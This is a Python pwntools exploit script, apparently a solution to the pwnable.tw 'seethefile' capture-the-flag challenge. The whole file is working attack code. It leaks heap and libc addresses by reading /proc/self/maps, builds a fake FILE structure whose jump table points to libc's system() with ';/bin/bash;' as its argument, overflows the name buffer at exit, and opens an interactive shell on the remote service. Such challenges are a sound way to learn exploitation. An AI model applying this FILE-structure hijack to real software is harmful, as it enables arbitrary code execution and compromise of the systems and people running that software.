from pwn import *
context.log_level="debug"
libc=ELF("./bc.so.6")



def passed(str):
	# scanf will stop when read these bytes
	scanf_set={"\x09","\x0a","\x0b","\x0c","\x0d","\x20"}
	for i in str:
		if i in scanf_set:
			return False
	return True

def open(conn,file):
	conn.sendlineafter("Your choice :","1")
	conn.sendlineafter("What do you want to see :",file)
	conn.recvline()

def read(conn):
	conn.sendlineafter("Your choice :","2")

def write(conn):
	conn.sendlineafter("Your choice :","3")
	return conn.recvuntil("---------------MENU---------------\n")

def exit(conn,name):
	conn.sendlineafter("Your choice :","5")
	conn.sendlineafter("Leave your name :",name)

def leak_address(conn):
	open(conn,"/proc/self/maps")
	read(conn)
	data=write(conn)
	heap_add=int(data.split("\n")[3][:8],16)
	read(conn)
	data=write(conn)
	libc_add=int(data.split("\n")[1][:8],16)
	read(conn)
	read(conn)
	data=write(conn)
	stack_add=int(data.split("\n")[2][:8],16)
	return heap_add,libc_add,stack_add


while True:
	# conn=process("./seethefile")
	conn=remote("chall.pwnable.tw",10200)
	heap_add,libc_add,stack_add=leak_address(conn)

	f={ # begin at 0x804b260
		0:"aaaa",
		4:p32(0x08048A37),
		0x20:p32(0x804b260+0x30),

		# fake FILE struct begin at 0x804b290
		0x30:p32(0xfbad2488),
		0x34:";/bin/bash;",
		0x68:p32(3),
		0x78:p32(heap_add+0x10a8),
		0x7c:p32(0xffffffff)*2,
		0x88:p32(heap_add+0x10b4),
		0x98:p32(0xffffffff),
		0xc4:p32(0x804b260+0x200), #jump table at 0x804b260+0x200
		0x200+0x44:p32(libc_add+libc.symbols["system"]) # jump to system
	}
	payload=fit(f,filler="\x00")
	# make sure all bytes can be read by scanf
	if passed(payload):
		break
	else:
		conn.close()

# log.debug("pid:%s"%str(conn.pid))
log.debug("libc_add:%s"%hex(libc_add))
log.debug("heap_add:%s"%hex(heap_add))
log.debug("stack_add:%s"%hex(stack_add))


exit(conn,payload)

conn.interactive()




